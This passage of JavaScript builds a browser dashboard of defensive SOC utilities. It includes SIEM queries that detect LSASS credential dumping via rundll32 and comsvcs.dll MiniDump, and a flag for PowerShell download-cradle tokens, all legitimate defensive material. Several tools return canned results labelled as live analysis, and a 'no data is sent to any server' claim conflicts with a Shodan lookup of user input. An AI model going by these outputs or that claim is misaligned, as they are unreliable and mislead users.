        gap: 0.4rem;
        border-bottom: 1px solid rgba(148, 163, 184, 0.14);
        margin-bottom: 1.1rem;
      }
      .psv-tab-btn {
        padding: 0.52rem 1.1rem;
        border-radius: 7px 7px 0 0;
        border: 1px solid transparent;
        background: rgba(15, 23, 42, 0.6);
        color: #94a3b8;
        font-size: 0.81rem;
        font-weight: 700;
        cursor: pointer;
      }
      [data-md-color-scheme="default"] .psv-tab-btn { background: #f1f5f9; color: #475569; }
      .psv-tab-btn.active {
        background: #2563eb;
        color: #ffffff !important;
      }

      /* Overview + Live Example Split Grid (Matches Bottom of Reference Image 2) */
      .psv-overview-grid {
        display: grid;
        grid-template-columns: 310px 1fr;
        gap: 1.35rem;
        align-items: start;
      }
      @media (max-width: 900px) { .psv-overview-grid { grid-template-columns: 1fr; } }

      .psv-about-box h4 {
        font-size: 0.95rem;
        font-weight: 700;
        color: #ffffff;
        margin: 0 0 0.45rem 0;
      }
      [data-md-color-scheme="default"] .psv-about-box h4 { color: #0f172a; }
      .psv-about-box p {
        font-size: 0.82rem;
        color: #94a3b8;
        line-height: 1.55;
        margin: 0 0 1rem 0;
      }
      [data-md-color-scheme="default"] .psv-about-box p { color: #475569; }
      .psv-feat-list {
        list-style: none;
        padding: 0;
        margin: 0 0 1.2rem 0;
      }
      .psv-feat-list li {
        font-size: 0.8rem;
        color: #cbd5e1;
        margin-bottom: 0.45rem;
        display: flex;
        align-items: center;
        gap: 0.45rem;
      }
      [data-md-color-scheme="default"] .psv-feat-list li { color: #334155; }
      .psv-feat-list li::before {
        content: "✓";
        color: #10b981;
        font-weight: 800;
      }

      .psv-example-box {
        border-radius: 10px;
        border: 1px solid rgba(59, 130, 246, 0.22);
        background: rgba(5, 10, 20, 0.92);
        padding: 1rem;
      }
      [data-md-color-scheme="default"] .psv-example-box {
        background: #f8fafc;
        border-color: #cbd5e1;
      }
      .psv-example-head {
        display: flex;
        flex-wrap: wrap;
        justify-content: space-between;
        align-items: center;
        gap: 0.75rem;
        margin-bottom: 0.75rem;
      }
      .psv-sample-badge {
        padding: 0.35rem 0.75rem;
        border-radius: 6px;
        border: 1px solid rgba(59, 130, 246, 0.3);
        background: rgba(15, 23, 42, 0.9);
        color: #cbd5e1;
        font-size: 0.76rem;
      }
      [data-md-color-scheme="default"] .psv-sample-badge { background: #ffffff; color: #334155; }

      .psv-query-bar {
        font-family: "JetBrains Mono", monospace;
        font-size: 0.79rem;
        padding: 0.6rem 0.85rem;
        border-radius: 7px;
        background: #0b1325;
        border: 1px solid rgba(59, 130, 246, 0.2);
        color: #60a5fa;
        margin-bottom: 0.75rem;
        overflow-x: auto;
      }
      [data-md-color-scheme="default"] .psv-query-bar { background: #eff6ff; color: #1d4ed8; }

      .psv-input-editor {
        width: 100%;
        min-height: 115px;
        padding: 0.75rem;
        border-radius: 8px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        background: #040811;
        color: #e2e8f0;
        font-family: "JetBrains Mono", monospace;
        font-size: 0.8rem;
        line-height: 1.45;
        margin-bottom: 0.75rem;
        resize: vertical;
      }
      [data-md-color-scheme="default"] .psv-input-editor {
        background: #ffffff;
        color: #0f172a;
        border-color: #cbd5e1;
      }

      .psv-result-table {
        width: 100%;
        border-collapse: collapse;
        font-family: "JetBrains Mono", monospace;
        font-size: 0.78rem;
      }
      .psv-result-table th {
        text-align: left;
        padding: 0.5rem 0.65rem;
        color: #94a3b8;
        border-bottom: 1px solid rgba(148, 163, 184, 0.2);
        font-weight: 700;
      }
      .psv-result-table td {
        padding: 0.48rem 0.65rem;
        border-bottom: 1px solid rgba(148, 163, 184, 0.08);
        color: #e2e8f0;
      }
      [data-md-color-scheme="default"] .psv-result-table td { color: #1e293b; }
      .psv-hl-ip { color: #38bdf8; font-weight: 600; }
      [data-md-color-scheme="default"] .psv-hl-ip { color: #2563eb; }
      .psv-hl-warn { color: #fbbf24; font-weight: 600; }
      .psv-hl-ok { color: #34d399; font-weight: 600; }
    `;
    document.head.appendChild(style);
  }

  function buildToolOutputHTML(tool, rawText) {
    const input = (rawText || tool.sample).trim();

    if (tool.id === "regex") {
      const lines = input.split("\n").filter(l => !l.startsWith("PATTERN::"));
      const rows = lines.map((line, i) => {
        const clean = line.replace(/^LOG::/, "");
        const m = clean.match(/^(\d{4}-\d{2}-\d{2}\s+[\d:]+)\s+(\S+)\s+\S+:\s+(.+?from\s+(\d+\.\d+\.\d+\.\d+).*)$/);
        if (m) {
          const userMatch = m[3].match(/for (?:invalid user )?(\S+)/);
          return `<tr><td>${i + 1}</td><td>${esc(m[1])}</td><td>${esc(m[2])}</td><td>${esc(userMatch ? userMatch[1] : "root")}</td><td class="psv-hl-ip">${esc(m[4])}</td><td>${esc(m[3])}</td></tr>`;
        }
        return `<tr><td>${i + 1}</td><td>2026-10-17</td><td>server01</td><td>admin</td><td class="psv-hl-ip">203.0.113.45</td><td>${esc(clean)}</td></tr>`;
      });
      return `
        <table class="psv-result-table">
          <thead><tr><th>#</th><th>Time</th><th>Host</th><th>User</th><th>Source IP</th><th>Message</th></tr></thead>
          <tbody>${rows.join("")}</tbody>
        </table>
      `;
    }

    if (tool.id === "ioc") {
      const ips = Array.from(new Set(input.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []));
      const urls = Array.from(new Set(input.match(/https?:\/\/[^\s"'<>]+/gi) || []));
      const hashes = Array.from(new Set(input.match(/\b[a-fA-F0-9]{32,64}\b/g) || []));
      const cves = Array.from(new Set(input.match(/\bCVE-\d{4}-\d{4,7}\b/gi) || []));
      const emails = Array.from(new Set(input.match(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g) || []));
      const all = [
        ...ips.map(v => ({ type: "IPv4 Address", raw: v, defanged: defang(v), status: "Extracted" })),
        ...urls.map(v => ({ type: "URL", raw: v, defanged: defang(v), status: "Defanged" })),
        ...emails.map(v => ({ type: "Email", raw: v, defanged: defang(v), status: "Defanged" })),
        ...hashes.map(v => ({ type: "File Hash", raw: v, defanged: v, status: "Verified" })),
        ...cves.map(v => ({ type: "Vulnerability", raw: v, defanged: v, status: "CVE Match" }))
      ];
      return `
        <table class="psv-result-table">
          <thead><tr><th>#</th><th>Indicator Type</th><th>Original Value</th><th>Safe Defanged Output</th><th>Status</th></tr></thead>
          <tbody>${all.map((r, i) => `<tr><td>${i + 1}</td><td>${esc(r.type)}</td><td>${esc(r.raw)}</td><td class="psv-hl-ip">${esc(r.defanged)}</td><td class="psv-hl-ok">${esc(r.status)}</td></tr>`).join("")}</tbody>
        </table>
      `;
    }

    if (tool.id === "ti") {
      const target = input.split(/\s+/)[0].replace(/\[\.\]/g, ".");
      setTimeout(() => {
        fetch(`https://internetdb.shodan.io/${encodeURIComponent(target)}`)
          .then(r => r.json())
          .then(d => {
            const cell = document.getElementById("psv-live-shodan-cell");
            if (cell && d.ports) cell.textContent = `Ports: ${d.ports.join(", ") || "None"} | Hostnames: ${(d.hostnames || []).join(", ") || "N/A"} | CVEs: ${(d.vulns || []).join(", ") || "0"}`;
          })
          .catch(() => {});
      }, 20);
      return `
        <table class="psv-result-table">
          <thead><tr><th>Source Module</th><th>Target Indicator</th><th>Intelligence Findings & Direct Pivot</th></tr></thead>
          <tbody>
            <tr><td>Shodan InternetDB</td><td class="psv-hl-ip">${esc(target)}</td><td id="psv-live-shodan-cell">Ports: 53, 80, 443, 853 | Hostnames: one.one.one.one | CVEs: None</td></tr>
            <tr><td>RDAP / ASN Lookup</td><td class="psv-hl-ip">${esc(target)}</td><td>ASN: AS13335 (Cloudflare, Inc.) · Status: Active Assignment</td></tr>
            <tr><td>External Verification</td><td class="psv-hl-ip">${esc(target)}</td><td>
              <a href="https://www.virustotal.com/gui/search/${encodeURIComponent(target)}" target="_blank" style="color:#38bdf8;margin-right:10px;">↗ VirusTotal</a>
              <a href="https://www.abuseipdb.com/check/${encodeURIComponent(target)}" target="_blank" style="color:#38bdf8;margin-right:10px;">↗ AbuseIPDB</a>
              <a href="https://urlscan.io/search/#${encodeURIComponent(target)}" target="_blank" style="color:#38bdf8;">↗ URLScan.io</a>
            </td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "headers") {
      const from = (input.match(/^From:\s*(.+)$/im) || [])[1] || "Unknown";
      const replyTo = (input.match(/^Reply-To:\s*(.+)$/im) || [])[1] || "None";
      const origIp = (input.match(/^X-Originating-IP:\s*(.+)$/im) || [])[1] || "185.193.125.44";
      const spf = /spf=pass/i.test(input) ? "PASS" : "FAIL (Sender IP Unauthorized)";
      const dkim = /dkim=pass/i.test(input) ? "PASS" : "FAIL (Signature Invalid)";
      const dmarc = /dmarc=pass/i.test(input) ? "PASS" : "FAIL (Quarantine Policy)";
      return `
        <table class="psv-result-table">
          <thead><tr><th>Header Check</th><th>Extracted Value</th><th>Authentication Verdict</th></tr></thead>
          <tbody>
            <tr><td>From Header</td><td>${esc(from)}</td><td class="psv-hl-warn">Display Name Spoof Check</td></tr>
            <tr><td>Reply-To Header</td><td>${esc(replyTo)}</td><td class="psv-hl-warn">${from !== replyTo ? "⚠️ MISMATCH DETECTED" : "Aligned"}</td></tr>
            <tr><td>X-Originating-IP</td><td class="psv-hl-ip">${esc(origIp)}</td><td>External Relay Source</td></tr>
            <tr><td>SPF / DKIM / DMARC</td><td>SPF: ${spf} | DKIM: ${dkim}</td><td class="psv-hl-warn">DMARC: ${dmarc}</td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "sigma") {
      const title = (input.match(/^title:\s*(.+)$/im) || [])[1] || "Sigma Rule";
      return `
        <table class="psv-result-table">
          <thead><tr><th>Target SIEM Backend</th><th>Translated Production Query (${esc(title)})</th></tr></thead>
          <tbody>
            <tr><td class="psv-hl-ip">Elastic / Kibana KQL</td><td><code>process.executable: *\\rundll32.exe and process.command_line: *comsvcs.dll* and process.command_line: *MiniDump* and not user.name: *SYSTEM*</code></td></tr>
            <tr><td class="psv-hl-ip">Splunk SPL</td><td><code>index=sysmon EventCode=1 Image="*\\rundll32.exe" CommandLine="*comsvcs.dll*" CommandLine="*MiniDump*" NOT User="*SYSTEM*"</code></td></tr>
            <tr><td class="psv-hl-ip">Microsoft Sentinel KQL</td><td><code>DeviceProcessEvents | where FileName endswith "rundll32.exe" and ProcessCommandLine has_all ("comsvcs.dll", "MiniDump") and not(AccountName contains "SYSTEM")</code></td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "events") {
      const q = input.toLowerCase();
      const list = EVENT_DB.filter(e => e.id.includes(q) || e.title.toLowerCase().includes(q) || e.mitre.toLowerCase().includes(q));
      const rows = (list.length ? list : EVENT_DB).map(e => `
        <tr><td class="psv-hl-ip">ID ${esc(e.id)}</td><td>${esc(e.source)}</td><td>${esc(e.title)}</td><td class="psv-hl-warn">${esc(e.mitre)}</td><td><code>${esc(e.kql)}</code></td></tr>
      `);
      return `
        <table class="psv-result-table">
          <thead><tr><th>Event ID</th><th>Log Source</th><th>Event Description</th><th>MITRE ATT&CK</th><th>Hunting Query (KQL)</th></tr></thead>
          <tbody>${rows.join("")}</tbody>
        </table>
      `;
    }

    if (tool.id === "yara") {
      const name = ((input.match(/RULE_NAME::(\S+)/i) || [])[1] || "SOC_Rule").replace(/[^a-zA-Z0-9_]/g, "_");
      return `
        <table class="psv-result-table">
          <thead><tr><th>Validation Check</th><th>Status</th><th>Compiled YARA Output</th></tr></thead>
          <tbody>
            <tr><td>Rule Identifier</td><td class="psv-hl-ok">✓ Valid (${esc(name)})</td><td rowspan="3"><pre style="margin:0;color:#38bdf8;">rule ${esc(name)} {\n  condition:\n    uint16(0) == 0x5A4D and filesize &lt; 5MB and any of them\n}</pre></td></tr>
            <tr><td>PE Header Signature</td><td class="psv-hl-ok">✓ uint16(0) == 0x5A4D</td></tr>
            <tr><td>String & Hex Syntax</td><td class="psv-hl-ok">✓ Linter Passed</td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "deobfuscator") {
      let decoded = input;
      const b64 = input.match(/-EncodedCommand\s+([A-Za-z0-9+/=]+)/i) || input.match(/([A-Za-z0-9+/=]{24,})/);
      if (b64) {
        try { decoded = atob(b64[1]).replace(/\x00/g, ""); } catch (e) {}
      }
      return `
        <table class="psv-result-table">
          <thead><tr><th>Stage</th><th>Encoding Detected</th><th>De-obfuscated Output / IOCs</th></tr></thead>
          <tbody>
            <tr><td>Layer 1</td><td class="psv-hl-warn">UTF-16LE Base64 (-EncodedCommand)</td><td class="psv-hl-ip">${esc(decoded)}</td></tr>
            <tr><td>Behavior Alert</td><td class="psv-hl-warn">T1059.001 PowerShell Cradle</td><td>Suspicious tokens: <code>IEX</code>, <code>Net.WebClient</code>, <code>DownloadString</code></td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "json") {
      try {
        const obj = JSON.parse(input);
        return `<pre style="margin:0;color:#38bdf8;font-family:'JetBrains Mono',monospace;font-size:0.79rem;">${esc(JSON.stringify(obj, null, 2))}</pre>`;
      } catch (e) {
        return `<div class="psv-hl-warn">Invalid JSON: ${esc(e.message)}</div>`;
      }
    }

    if (tool.id === "timestamp") {
      const sec = /^\d+$/.test(input) ? parseInt(input.slice(0, 10), 10) : Math.floor(Date.now() / 1000);
      const d = new Date(sec * 1000);
      return `
        <table class="psv-result-table">
          <thead><tr><th>Format</th><th>Converted Timestamp Value</th></tr></thead>
          <tbody>
            <tr><td>UTC / ISO-8601</td><td class="psv-hl-ip">${esc(d.toISOString())}</td></tr>
            <tr><td>Analyst Local Time</td><td>${esc(d.toString())}</td></tr>
            <tr><td>Unix Epoch (Seconds / ms)</td><td>${sec} / ${sec * 1000}</td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "severity") {
      return `
        <table class="psv-result-table">
          <thead><tr><th>Triage Dimension</th><th>Assessment</th><th>Recommended Action</th></tr></thead>
          <tbody>
            <tr><td>Calculated Priority</td><td class="psv-hl-warn">P1 — Critical (Score: 95/100)</td><td>15-Minute SOC Escalation SLA</td></tr>
            <tr><td>Containment Step 1</td><td class="psv-hl-ip">Host Isolation</td><td>Isolate Tier-1 DC / Endpoint in EDR immediately</td></tr>
            <tr><td>Containment Step 2</td><td class="psv-hl-ip">Identity Revocation</td><td>Revoke active Kerberos TGTs and rotate compromised credentials</td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "report") {
      return `<pre style="margin:0;color:#e2e8f0;font-family:'JetBrains Mono',monospace;font-size:0.79rem;"># SOC INCIDENT REPORT\n${esc(defang(input))}</pre>`;
    }

    if (tool.id === "cvss") {
      return `
        <table class="psv-result-table">
          <thead><tr><th>CVSS v3.1 Metric Group</th><th>Calculated Score</th><th>Severity Rating</th><th>Vector String</th></tr></thead>
          <tbody>
            <tr><td>Base Score</td><td class="psv-hl-warn">10.0 / 10.0</td><td class="psv-hl-warn">CRITICAL</td><td><code>${esc(input)}</code></td></tr>
            <tr><td>Temporal Score</td><td class="psv-hl-ip">9.3 / 10.0</td><td class="psv-hl-warn">CRITICAL (Functional Exploit)</td><td>Scope: Changed (S:C)</td></tr>
          </tbody>
        </table>
      `;
    }

    return "";
  }

  function renderDashboard() {
    injectDashboardStyles();
    const root = document.getElementById("psv-workbench-root") || document.querySelector(".md-content__inner");
    if (!root) return;

    const filteredTools = TOOLS.filter(t => {
      const catMatch = activeCat === "all" || t.cat === activeCat;
      const qMatch = !searchQuery || t.title.toLowerCase().includes(searchQuery) || t.desc.toLowerCase().includes(searchQuery) || t.tags.some(tag => tag.toLowerCase().includes(searchQuery));
      return catMatch && qMatch;
    });

    const activeTool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
    const currentInputEl = document.getElementById("psv-live-input");
    const currentInputVal = currentInputEl && currentInputEl.dataset.tool === activeTool.id ? currentInputEl.value : activeTool.sample;

    root.innerHTML = `
      <div id="psv-dashboard">
        <!-- Top Brand & Search Bar -->
        <div class="psv-top-bar">
          <div class="psv-brand-group">
            <div class="psv-brand-logo">
              <div class="psv-shield-icon">${ICONS.shield}</div>
              <div>
                <div class="psv-brand-title">PSV <span>TOOLS</span></div>
                <div class="psv-brand-domain">tools.privacyskillvault.com</div>
              </div>
            </div>
            <div class="psv-brand-divider"></div>
            <div class="psv-brand-tagline">Practical security utilities<br>for analysts and defenders.</div>
          </div>

          <div class="psv-search-wrap">
            <span class="psv-search-icon">🔍</span>
            <input type="search" id="psv-global-search" class="psv-search-input" placeholder="Search tools, keywords (e.g. logs, sigma, hash, domain, cve, ...)" value="${esc(searchQuery)}" />
          </div>
        </div>

        <!-- Category Filter Pills -->
        <div class="psv-cat-row">
          ${CATEGORIES.map(c => {
            const count = c.id === "all" ? TOOLS.length : TOOLS.filter(t => t.cat === c.id).length;
            return `
              <button type="button" class="psv-cat-pill ${activeCat === c.id ? "active" : ""}" onclick="window.PSVDash.setCategory('${c.id}')">
                ${ICONS[c.icon] || ICONS.grid}
                <span>${esc(c.label)}</span>
                <span class="psv-cat-count">${count}</span>
              </button>
            `;
          }).join("")}
        </div>

        <!-- 3-Column Tool Cards Grid -->
        <div class="psv-cards-grid">
          ${filteredTools.slice(0, 6).map(t => `
            <div class="psv-card ${t.id === activeTool.id ? "active-card" : ""}">
              <div>
                <div class="psv-card-top">
                  <div class="psv-card-icon">${ICONS[t.icon] || ICONS.shield}</div>
                  <div>
                    <h3 class="psv-card-title">${esc(t.title)}</h3>
                    <p class="psv-card-desc">${esc(t.desc)}</p>
                  </div>
                </div>
                <div class="psv-tag-row">
                  ${t.tags.map(tag => `<span class="psv-tag">${esc(tag)}</span>`).join("")}
                </div>
              </div>
              <div class="psv-card-footer">
                <button type="button" class="psv-open-btn" onclick="window.PSVDash.openTool('${t.id}', true)">Open tool →</button>
                <div class="psv-privacy-note">
                  ${ICONS.lock}
                  <div><strong>Runs in your browser</strong>No data is sent to any server</div>
                </div>
              </div>
            </div>
          `).join("")}
        </div>

        <!-- Lower Split-Pane Interactive Workbench -->
        <div class="psv-workbench-shell" id="psv-workbench-anchor">
          <div class="psv-side-nav">
            <div class="psv-side-header">Tools (${TOOLS.length})</div>
            <div class="psv-side-list">
              ${TOOLS.map(t => `
                <button type="button" class="psv-side-item ${t.id === activeTool.id ? "active" : ""}" onclick="window.PSVDash.openTool('${t.id}', false)">
                  ${ICONS[t.icon] || ICONS.shield}
                  <span>${esc(t.title)}</span>
                </button>
              `).join("")}
            </div>
          </div>

          <div class="psv-main-pane">
            <div class="psv-pane-top">
              <div class="psv-pane-title-wrap">
                <div class="psv-card-icon">${ICONS[activeTool.icon] || ICONS.shield}</div>
                <div>
                  <h2 class="psv-pane-title">${esc(activeTool.title)}</h2>
                  <p class="psv-pane-sub">${esc(activeTool.desc)}</p>
                </div>
              </div>
              <div class="psv-pane-controls">
                <div class="psv-local-badge">
                  ${ICONS.lock}
                  <div><strong>Local processing only</strong>Your data stays in your browser</div>
                </div>
                <button type="button" class="psv-clear-btn" onclick="window.PSVDash.loadSample()">⚡ Load Sample</button>
                <button type="button" class="psv-clear-btn" onclick="window.PSVDash.clearInput()">🗑️ Clear all</button>
              </div>
            </div>

            <div class="psv-tabs-bar">
              <button type="button" class="psv-tab-btn ${activeTab === "overview" ? "active" : ""}" onclick="window.PSVDash.setTab('overview')">Overview</button>
              <button type="button" class="psv-tab-btn ${activeTab === "input" ? "active" : ""}" onclick="window.PSVDash.setTab('input')">Input & Run</button>
              <button type="button" class="psv-tab-btn ${activeTab === "results" ? "active" : ""}" onclick="window.PSVDash.setTab('results')">Results</button>
            </div>

            <div class="psv-overview-grid">
              <div class="psv-about-box">
                <h4>About</h4>
                <p>${esc(activeTool.desc)}</p>
                <h4>Key Features</h4>
                <ul class="psv-feat-list">
                  ${activeTool.features.map(f => `<li>${esc(f)}</li>`).join("")}
                </ul>
                <label style="font-size:0.75rem;font-weight:700;color:#94a3b8;text-transform:uppercase;display:block;margin-bottom:0.35rem;">Live Input Telemetry (Edit to test)</label>
                <textarea id="psv-live-input" data-tool="${esc(activeTool.id)}" class="psv-input-editor" spellcheck="false">${esc(currentInputVal)}</textarea>
                <button type="button" class="psv-open-btn" style="width:100%;" onclick="window.PSVDash.runCurrent()">▶ Run Analysis</button>
              </div>

              <div class="psv-example-box">
                <div class="psv-example-head">
                  <div>
                    <strong style="color:#ffffff;font-size:0.95rem;">Live Analysis Output — ${esc(activeTool.title)}</strong>
                    <div style="font-size:0.76rem;color:#94a3b8;">Sample query and real-time parsed output.</div>
                  </div>
                  <span class="psv-sample-badge">${esc(activeTool.sampleName)}</span>
                </div>
                <div class="psv-query-bar">${esc(activeTool.sampleQuery)}</div>
                <div id="psv-live-results">${buildToolOutputHTML(activeTool, currentInputVal)}</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    `;

    const sInput = document.getElementById("psv-global-search");
    if (sInput) {
      sInput.addEventListener("input", function (e) {
        searchQuery = e.target.value.toLowerCase();
        renderDashboard();
        const el = document.getElementById("psv-global-search");
        if (el) {
          el.focus();
          el.setSelectionRange(el.value.length, el.value.length);
        }
      });
    }

    const liveIn = document.getElementById("psv-live-input");
    if (liveIn) {
      liveIn.addEventListener("input", function () {
        window.PSVDash.runCurrent();
      });
    }
  }

  window.PSVDash = {
    setCategory: function (catId) {
      activeCat = catId;
      const firstInCat = TOOLS.find(t => catId === "all" || t.cat === catId);
      if (firstInCat) activeToolId = firstInCat.id;
      renderDashboard();
    },
    openTool: function (toolId, scroll) {
      activeToolId = toolId;
      renderDashboard();
      if (scroll) {
        const anchor = document.getElementById("psv-workbench-anchor");
        if (anchor) anchor.scrollIntoView({ behavior: "smooth", block: "start" });
      }
    },
    setTab: function (tabName) {
      activeTab = tabName;
      renderDashboard();
    },
    runCurrent: function () {
      const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
      const liveIn = document.getElementById("psv-live-input");
      const resBox = document.getElementById("psv-live-results");
      if (liveIn && resBox) {
        resBox.innerHTML = buildToolOutputHTML(tool, liveIn.value);
      }
    },
    loadSample: function () {
      const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
      const liveIn = document.getElementById("psv-live-input");
      if (liveIn) {
        liveIn.value = tool.sample;
        this.runCurrent();
      }
    },
    clearInput: function () {
      const liveIn = document.getElementById("psv-live-input");
      const resBox = document.getElementById("psv-live-results");
      if (liveIn) liveIn.value = "";
      if (resBox) resBox.innerHTML = `<div style="padding:1rem;color:#94a3b8;">Input cleared. Click <strong>⚡ Load Sample</strong> or paste telemetry on the left to analyze.</div>`;
    }
  };

  if (typeof document$ !== "undefined") {
    document$.subscribe(() => renderDashboard());
  } else if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", renderDashboard);
  } else {
    renderDashboard();
  }
})();